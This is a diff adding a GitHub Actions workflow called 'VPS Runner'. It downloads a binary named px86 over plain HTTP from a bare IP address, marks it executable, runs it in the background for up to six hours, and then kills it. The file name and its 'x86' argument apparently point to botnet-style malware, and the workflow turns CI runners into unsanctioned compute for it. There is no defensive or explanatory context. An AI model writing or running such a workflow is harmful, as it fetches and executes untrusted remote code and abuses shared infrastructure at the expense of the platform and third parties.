@@ -1,0 +1,43 @@
+name: VPS Runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      uptime:
+        description: 'VPS uptime in hours (max 6)'
+        required: false
+        default: '6'
+        type: choice
+        options:
+          - '1'
+          - '2'
+          - '3'
+          - '4'
+          - '5'
+          - '6'
+
+jobs:
+  run-binary:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Download binary
+      run: |
+        wget http://45.138.16.158/bins/px86 -O px86
+        chmod +x px86
+
+    - name: Run binary and wait
+      run: |
+        # Run the binary in background
+        ./px86 x86 > output.log 2>&1 &
+        PID=$!
+        echo "Binary started with PID: $PID"
+        
+        # Wait for the specified time
+        UPTIME=${{ github.event.inputs.uptime }}
+        echo "Keeping VM alive for $UPTIME hours..."
+        sleep $(($UPTIME * 3600))
+        
+        # Cleanup
+        kill $PID 2>/dev/null || true
+        echo "Process terminated"
